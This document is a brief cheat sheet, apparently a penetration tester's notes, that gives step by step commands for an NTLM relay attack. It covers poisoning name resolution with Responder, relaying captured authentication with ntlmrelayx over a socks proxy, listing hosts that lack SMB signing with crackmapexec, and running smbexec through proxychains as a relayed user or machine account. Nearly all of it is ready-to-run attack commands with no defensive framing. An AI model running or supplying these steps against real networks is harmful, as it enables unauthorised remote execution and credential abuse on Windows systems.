# How To NTLMRelay

## Notes
 - Configure /etc/proxychains.conf to not proxy DNS and use local port 1080:
   `#proxy_dns`
   `socks4 127.0.0.1 1080`   
 - Start Responder.py with SMB and HTTP disabled(!):   
   `sudo /opt/Responder/Responder.py -I eth1 -w -r -f -d`   
 - Start ntlmrelayx with options socks:   
   `ntlmrelayx.py -tf targets.txt -smb2support -socks`  
 - Targets (systems without SMB signing) can be gathered with:   
   `crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt`   
 
## Using the socks connection
 - Once there is an authenticated socks connection (check with command "socks" in ntlmrelayx console), it can be used with proxychains:   
   `proxychains smbexec.py 'DOMAIN/user:gugus@<target-ip>'`   
 - If you relay a machine account:   
   `proxychains smbexec.py 'DOMAIN/MACHINE$:gugus@<target-ip>'`   
